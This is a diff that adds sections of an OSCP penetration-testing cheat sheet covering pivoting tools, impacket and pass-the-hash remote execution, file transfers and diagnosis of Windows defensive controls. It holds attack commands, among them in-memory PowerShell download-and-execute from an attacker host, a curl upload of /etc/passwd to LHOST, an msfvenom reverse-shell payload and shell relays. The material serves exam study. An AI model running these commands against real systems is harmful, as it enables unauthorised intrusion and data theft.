@@ -1,0 +1,405 @@
+<h2 id="ref-14-lateral-movement-pivoting">14. LATERAL MOVEMENT &amp; PIVOTING</h2>
+<blockquote>
+<p><strong>2026 rule:</strong> every pivot changes your attack surface. Re-enumerate
+instead of assuming the old network view still applies.</p>
+</blockquote>
+<details id="ref-14-1-re-enumeration-after-every-foothold-pivot">
+<summary>🔄 14.1 Re-Enumeration After Every Foothold/Pivot</summary>
+<p><code>[PIVOT:FLOW]</code></p>
+<p>Linux:</p>
+<pre class="ref-code"><code class="language-bash">ip addr
+ip route
+ip neigh
+cat /etc/hosts
+cat /etc/resolv.conf
+ss -lntup
+</code></pre>
+<p>Windows:</p>
+<pre class="ref-code"><code class="language-cmd">ipconfig /all
+route print
+arp -a
+netstat -ano
+</code></pre>
+<p>Then re-check:</p>
+<ul>
+<li>[ ] New interfaces</li>
+<li>[ ] New routes</li>
+<li>[ ] Internal DNS</li>
+<li>[ ] Internal hostnames</li>
+<li>[ ] New SMB/LDAP/RDP/WinRM services</li>
+<li>[ ] Local-only web applications</li>
+<li>[ ] New credentials</li>
+<li>[ ] New domain relationships</li>
+</ul>
+</details>
+<details id="ref-14-2-modern-pivot-tool-selection">
+<summary>🚇 14.2 Modern Pivot Tool Selection</summary>
+<p><code>[PIVOT:FLOW]</code></p>
+<pre class="ref-code"><code class="language-text">Need routed access / multiple internal services?
+    → Ligolo-ng
+
+Need simple TCP tunneling?
+    → Chisel
+
+Have SSH?
+    → SSH local/remote forwarding or SOCKS
+
+Need one service exposed?
+    → SSH -L / socat
+</code></pre>
+<p>Tools:</p>
+<pre class="ref-code"><code class="language-text">Ligolo-ng
+Chisel
+SSH
+socat
+proxychains
+</code></pre>
+<p>Do not assume proxychains + Nmap gives the same results as direct
+scanning. Prefer service-aware enumeration when operating through a
+SOCKS pivot.</p>
+</details>
+<details id="ref-14-1-pivoting-overview">
+<summary>🗺️ 14.1 Pivoting Overview</summary>
+<p><code>[PIVOT:FLOW]</code></p>
+<pre class="ref-code"><code>SCENARIO:
+[Kali] ──VPN──► [DMZ / Pivot Host] ──internal──► [Target Network]
+
+TOOL SELECTION:
+  SSH available on pivot?          → SSH tunnels (fastest setup)
+  Only HTTP/S reachable?           → Chisel (HTTP tunnel)
+  Want transparent routing?        → Ligolo-ng (BEST for OSCP)
+  Quick single port forward?       → Socat
+  Windows pivot, no SSH client?    → plink.exe or chisel.exe
+  Multiple pivots needed?          → Ligolo-ng chains
+
+proxychains vs ligolo-ng:
+  proxychains: routes through SOCKS proxy — some tools don't support it
+  ligolo-ng:   adds a real route to your routing table — every tool works!
+</code></pre>
+</details>
+<details id="ref-14-2-ligolo-ng-best-oscp-pivot-tool">
+<summary>⚡ 14.2 Ligolo-ng --- Best OSCP Pivot Tool</summary>
+<blockquote>
+<p>✅ <strong>EXAM-COMPATIBLE PIVOTING</strong> · ✓ FIRST CHOICE · <code>[REQ:NETWORK_PATH]</code></p>
+</blockquote>
+<p><code>[PIVOT:LIGOLO]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── PROXY ──────────────────────────────────────────────────────
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# In the Ligolo proxy console, print the self-signed certificate fingerprint:
+certificate_fingerprint
+
+# ── AGENT — PREFERRED CERTIFICATE VALIDATION ───────────────────
+# Linux:
+chmod +x agent
+./agent -connect LHOST:11601 -accept-fingerprint &lt;FINGERPRINT&gt;
+
+# Windows:
+.\agent.exe -connect LHOST:11601 -accept-fingerprint &lt;FINGERPRINT&gt;
+
+# △ EMERGENCY DEBUG FALLBACK ONLY:
+# ./agent -connect LHOST:11601 -ignore-cert
+# Official Ligolo docs warn that -ignore-cert disables certificate verification.
+
+# ── v0.9.1 VERIFIED MANAGED INTERFACE / ROUTING ───────────────
+# v0.8+ autoroute is an optional shortcut; this explicit flow is easier to audit/recover.
+# In proxy console:
+interface_create --name ligolo
+session
+# Select the pivot session interactively, then identify the internal route.
+ifconfig
+tunnel_start --tun ligolo
+
+# Add route from the Ligolo console:
+interface_add_route --name ligolo --route 192.168.100.0/24
+interface_add_route --name ligolo --route 10.10.10.0/24
+
+# ── MANUAL LINUX ROUTING FALLBACK ─────────────────────────────
+# If you created the TUN interface manually instead:
+# sudo ip tuntap add user $(whoami) mode tun ligolo
+# sudo ip link set ligolo up
+# sudo ip route add 192.168.100.0/24 dev ligolo
+
+# ── VERIFY BEFORE USING TOOLS ─────────────────────────────────
+ip route | grep ligolo
+ping -c 1 192.168.100.10 2&gt;/dev/null
+
+# Then normal tools can use the routed subnet:
+nmap -n -sT -Pn 192.168.100.10
+evil-winrm -i $INTERNAL_IP -u "$AUTH_USER" -p "$AUTH_PASS"
+impacket-psexec 'domain/user@192.168.100.10'
+
+# Reverse flow / listener example (confirm direction and local port first):
+listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
+listener_list
+# YOUR installed `listener_add -h` output wins if syntax differs.
+# Double pivot: establish another agent/session, then add the deeper route.
+</code></pre>
+</details>
+<details id="ref-14-3-chisel-http-tunneling">
+<summary>🔧 14.3 Chisel --- HTTP Tunneling</summary>
+<p><code>[PIVOT:CHISEL]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── SOCKS PROXY ───────────────────────────────────────────────
+# Attacker (server):
+./chisel server -p 8000 --reverse
+
+# Pivot (client):
+./chisel client LHOST:8000 R:socks      # SOCKS5 on attacker:1080
+# Windows:
+.\chisel.exe client LHOST:8000 R:socks
+
+# Configure proxychains:
+echo "socks5 127.0.0.1 1080" &gt;&gt; /etc/proxychains4.conf
+proxychains nmap -sT -Pn -p 22,80,445 192.168.x.0/24
+proxychains evil-winrm -i $INTERNAL_IP -u "$AUTH_USER" -p "$AUTH_PASS"
+
+# ── PORT FORWARD ──────────────────────────────────────────────
+./chisel client LHOST:8000 R:8080:192.168.x.10:80
+# Now: http://localhost:8080 → reaches internal 192.168.x.10:80
+</code></pre>
+</details>
+<details id="ref-14-4-ssh-tunneling-all-types">
+<summary>🔀 14.4 SSH Tunneling --- All Types</summary>
+<p><code>[PIVOT:SSH]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── LOCAL PORT FORWARD (access internal service) ──────────────
+ssh -L 8080:192.168.x.10:80 user@PIVOT -N
+# → curl http://127.0.0.1:8080  reaches 192.168.x.10:80
+
+# Multiple forwards:
+ssh -L 8080:10.0.0.10:80 -L 3306:10.0.0.10:3306 user@PIVOT -N
+
+# ── DYNAMIC SOCKS PROXY ───────────────────────────────────────
+ssh -D 1080 user@PIVOT -N -f    # -f = background
+# /etc/proxychains4.conf: socks5 127.0.0.1 1080
+proxychains nmap -sT -Pn 10.0.0.0/24
+
+# ── REMOTE PORT FORWARD (catch shell from internal) ───────────
+ssh -R 4444:127.0.0.1:4444 user@PIVOT -N
+# Internal machine sends rev shell to pivot:4444 → arrives at Kali:4444
+
+# ── KEEP ALIVE / BACKGROUND ───────────────────────────────────
+ssh -L 8080:10.0.0.10:80 user@PIVOT -N -f -o ServerAliveInterval=60
+</code></pre>
+</details>
+<details id="ref-14-5-socat-quick-methods">
+<summary>🔌 14.5 Socat &amp; Quick Methods</summary>
+<p><code>[PIVOT:SOCAT]</code></p>
+<pre class="ref-code"><code class="language-bash"># ── SOCAT PORT FORWARD ────────────────────────────────────────
+socat TCP-LISTEN:8080,fork TCP:192.168.x.10:80 &amp;
+socat TCP-LISTEN:4444,fork TCP:LHOST:5555 &amp;     # Rev shell relay
+
+# ── PLINK (Windows, GUI-less PuTTY) ──────────────────────────
+# Download plink.exe to Windows pivot
+plink.exe -l user -pw pass -R 4444:127.0.0.1:4444 LHOST
+plink.exe -l user -pw pass -D 1080 LHOST              # SOCKS
+
+# ── NETCAT RELAY (when nothing else works) ────────────────────
+mkfifo /tmp/pipe
+nc -lvp 8080 &lt; /tmp/pipe | nc 192.168.x.10 80 &gt; /tmp/pipe &amp;
+</code></pre>
+</details>
+<details id="ref-14-6-remote-execution-methods-post-compromise">
+<summary>🖥️ 14.6 Remote Execution Methods (Post-Compromise)</summary>
+<pre class="ref-code"><code class="language-bash"># ── SMB EXECUTION ─────────────────────────────────────────────
+impacket-psexec domain/user@IP     # Creates service, gives SYSTEM
+impacket-psexec domain/user@IP -hashes :NTLMHASH
+
+# ── WMI EXECUTION ─────────────────────────────────────────────
+impacket-wmiexec domain/user@IP    # No service created, less noise
+impacket-wmiexec domain/user@IP -hashes :NTLMHASH
+
+# ── SMB SERVICE (quieter than psexec) ─────────────────────────
+impacket-smbexec domain/user@IP    # No binary dropped on disk
+
+# ── WINRM ─────────────────────────────────────────────────────
+evil-winrm -i $IP -u "$AUTH_USER" -p "$AUTH_PASS"
+evil-winrm -i IP -u user -H NTLMHASH    # PtH
+
+# ── RDP ───────────────────────────────────────────────────────
+xfreerdp /u:"$AUTH_USER" /d:"$DOMAIN" /v:$IP +clipboard /dynamic-resolution /cert-ignore
+xfreerdp /u:Administrator /pth:NTLMHASH /v:IP  # PtH (RestrictedAdmin mode)
+
+# ── nxc TARGETED VALIDATION ───────────────────────────
+# After obtaining new material, start with one justified host/service from the scan/graph.
+nxc smb $TARGET -u Administrator -H HASH
+# Exact local/SAM provenance only:
+nxc smb $TARGET -u Administrator -H HASH --local-auth
+# Let Credential Debt / observed services decide any next host; do not blanket a subnet.
+</code></pre>
+</details>
+<hr/>
+<h2 id="ref-15-file-transfers-every-method">15. FILE TRANSFERS --- EVERY METHOD</h2>
+<details id="ref-15-1-serving-files-from-kali">
+<summary>🌐 15.1 Serving Files from Kali</summary>
+<pre class="ref-code"><code class="language-bash"># HTTP (most reliable):
+python3 -m http.server 80
+python3 -m http.server 8080
+
+# HTTPS (if target requires SSL):
+python3 -c "
+import http.server, ssl, os
+os.system('openssl req -new -x509 -keyout /tmp/server.pem -out /tmp/server.pem -days 365 -nodes -subj \"/CN=test\" 2&gt;/dev/null')
+httpd = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler)
+httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='/tmp/server.pem')
+httpd.serve_forever()"
+
+# SMB (best for Windows — no PowerShell needed):
+impacket-smbserver share $(pwd) -smb2support
+impacket-smbserver share $(pwd) -smb2support -username kali -password kali
+
+# FTP (for older Windows):
+python3 -m pyftpdlib -p 21 -w   # -w = write allowed
+
+# Upload receiver (catch files FROM target):
+python3 -m uploadserver 80
+# Target uses: curl -F 'files=@/etc/passwd' http://LHOST/upload
+</code></pre>
+</details>
+<details id="ref-15-2-download-on-windows-every-method">
+<summary>▣ 15.2 Download on Windows --- Every Method</summary>
+<p><code>[TRANSFER:WINDOWS]</code></p>
+<pre class="ref-code"><code class="language-powershell"># ── POWERSHELL (most reliable) ───────────────────────────────
+# Method 1: WebClient
+(New-Object System.Net.WebClient).DownloadFile("http://LHOST/file.exe","C:\Users\Public\file.exe")
+# Method 2: iwr
+iwr -Uri "http://LHOST/file.exe" -OutFile "C:\Users\Public\file.exe" -UseBasicParsing
+# Method 3: In-memory (NO DISK WRITE — best for AV evasion):
+IEX(New-Object Net.WebClient).DownloadString("http://LHOST/script.ps1")
+# Method 4: Encoded download+exec:
+powershell -enc BASE64ENCODED_IEX_COMMAND
+
+# ── CMD BUILT-INS ─────────────────────────────────────────────
+# Certutil:
+certutil.exe -urlcache -split -f "http://LHOST/file.exe" C:\Users\Public\file.exe
+# BITS:
+bitsadmin /transfer job /download /priority normal "http://LHOST/file.exe" "C:\Users\Public\file.exe"
+# curl (Win10+):
+curl.exe http://LHOST/file.exe -o C:\Users\Public\file.exe
+# From SMB:
+copy \\LHOST\share\file.exe C:\Users\Public\file.exe
+
+# ── BASE64 (no network needed) ────────────────────────────────
+# Attacker:
+base64 -w 0 file.exe; echo
+# Target (PowerShell):
+$b = "PASTE_BASE64_HERE"
+[IO.File]::WriteAllBytes("C:\Users\Public\file.exe",[Convert]::FromBase64String($b))
+</code></pre>
+</details>
+<details id="ref-15-3-download-on-linux-every-method">
+<summary>🐧 15.3 Download on Linux --- Every Method</summary>
+<p><code>[TRANSFER:LINUX]</code></p>
+<pre class="ref-code"><code class="language-bash">wget http://LHOST/file -O /tmp/file
+curl http://LHOST/file -o /tmp/file
+curl -sk https://LHOST/file -o /tmp/file  # Skip SSL verify
+
+# /dev/tcp (bash built-in — no tools needed!):
+exec 3&lt;&gt;/dev/tcp/LHOST/80
+echo -e "GET /file HTTP/1.0\r\nHost: LHOST\r\n\r\n" &gt;&amp;3
+cat &lt;&amp;3 | tail -n +7 &gt; /tmp/file   # Skip HTTP headers
+
+# Python:
+python3 -c "import urllib.request; urllib.request.urlretrieve('http://LHOST/file','/tmp/file')"
+
+# SCP (if SSH access):
+scp user@LHOST:/path/file /tmp/file
+scp -i key user@LHOST:/path/file /tmp/file
+</code></pre>
+</details>
+<details id="ref-15-4-exfiltration-get-files-back-to-kali">
+<summary>📤 15.4 Necessary File Retrieval --- RULE-SENSITIVE</summary>
+<div class="privacy" style="margin:10px 0"><strong>Current OSCP+ rule:</strong> do not download applications, files, or source code from the exam environment to your local machine unless the file is necessary to compromise the target. Delete the local copy after completing the objective. Prefer reading/searching the file in place first.</div>
+<pre class="ref-code"><code class="language-bash"># 1) FIRST: inspect remotely/in-place whenever possible
+sed -n '1,160p' /path/to/config
+grep -RniE 'pass|secret|token|key|jdbc|connection' /path/to/app 2&gt;/dev/null
+
+# 2) ONLY IF THE EXACT FILE IS NECESSARY FOR THE COMPROMISE:
+# Kali -&gt; retrieve ONE justified Linux file
+mkdir -p loot/necessary
+scp user@$IP:/absolute/path/to/NECESSARY_FILE loot/necessary/
+sha256sum loot/necessary/NECESSARY_FILE
+
+# Windows / Evil-WinRM -&gt; retrieve ONE justified file
+download C:\absolute\path\NECESSARY_FILE loot\necessary\NECESSARY_FILE
+
+# Record WHY the local copy was necessary and which target it came from.
+# After the objective is complete, delete the local exam-environment copy:
+rm -f loot/necessary/NECESSARY_FILE
+</code></pre>
+<p><strong>Do not use this as a collection/exfiltration checklist.</strong> Avoid recursive home/profile/share downloads, bulk archives, database dumps, or “grab everything and grep later” behavior. Retrieve the minimum exact artifact only when it is necessary for the compromise.</p>
+</details>
+<hr/>
+<h2 id="ref-16-antivirus-evasion-defense-bypass">16. EXECUTION CONSTRAINTS &amp; DEFENSIVE FRICTION</h2>
+<p><strong>Goal:</strong> determine <em>why</em> an otherwise valid action failed, then choose the smallest compatible path. Do not make “disable Defender / bypass AMSI” the default hypothesis. If you already have Administrator/SYSTEM, bank evidence before changing host security state.</p>
+<details id="ref-16-1-disable-bypass-windows-defender">
+<summary>🧭 16.1 Diagnose the constraint before changing anything</summary>
+<pre class="ref-code"><code class="language-powershell"># Identity / architecture / PowerShell mode
+whoami /all
+[Environment]::Is64BitProcess
+$PSVersionTable
+$ExecutionContext.SessionState.LanguageMode
+Get-ExecutionPolicy -List
+
+# Defensive state — READ ONLY
+Get-MpComputerStatus | Select-Object AMServiceEnabled,AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled
+Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
+
+# Available interpreters / transfer helpers
+where.exe powershell
+where.exe pwsh
+where.exe cmd
+where.exe certutil
+where.exe curl
+where.exe bitsadmin
+Get-Command powershell,pwsh,cmd,certutil,curl -ErrorAction SilentlyContinue</code></pre>
+<p><strong>Classify first:</strong> execution policy, Constrained Language/AppLocker/WDAC, AMSI/Defender detection, wrong architecture, filesystem ACL, missing interpreter, transfer failure, or simply a bad command. Preserve the exact error text.</p>
+</details>
+<details id="ref-16-2-amsi-bypass">
+<summary>🧰 16.2 Smallest fallback path</summary>
+<pre class="ref-code"><code class="language-powershell"># ExecutionPolicy is not the same as Defender/AMSI. For a script already transferred:
+powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\script.ps1
+
+# Native/manual fallbacks
+whoami /all
+sc query
+schtasks /query /fo LIST /v
+cmdkey /list
+netstat -ano
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s /v ImagePath
+
+# Confirm architecture
+wmic os get osarchitecture
+$env:PROCESSOR_ARCHITECTURE</code></pre>
+<p><strong>Preference order:</strong> native/manual check → alternate already-present interpreter/client → architecture-correct binary → only then a narrowly justified, reversible state change. Record the original state and reason for any mutation.</p>
+</details>
+<details id="ref-16-3-payload-obfuscation-techniques">
+<summary>🧪 16.3 Payload / shell troubleshooting without “evasion roulette”</summary>
+<pre class="ref-code"><code class="language-bash"># Verify boring failure modes first
+file payload.exe
+sha256sum payload.exe
+python3 -m http.server 8000 --directory .
+ss -lntp | grep ":$LPORT"
+ip route get $TARGET
+
+# Generate only the required architecture/format.
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe</code></pre>
+<p>If a payload is removed or blocked, capture the exact symptom and reconsider the delivery/execution primitive. Repacking, encoder chains, memory patches and broad security-control disabling are poor default exam-time debugging strategies.</p>
+</details>
+<details id="ref-16-4-constrained-language-mode-bypass">
+<summary>🔒 16.4 Constrained PowerShell — prove it, then pivot tools</summary>
+<pre class="ref-code"><code class="language-powershell">$ExecutionContext.SessionState.LanguageMode
+Get-ExecutionPolicy -List
+Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
+
+whoami /priv
+whoami /groups
+net user
+net localgroup administrators
+sc qc &lt;SERVICE&gt;
+schtasks /query /fo LIST /v
+reg query HKCU /f password /t REG_SZ /s
+reg query HKLM /f password /t REG_SZ /s</code></pre>
+<p>Do not assume “PowerShell failed” means “find an AMSI bypass.” First decide whether you need PowerShell at all.</p>
+</details>
+<hr/>
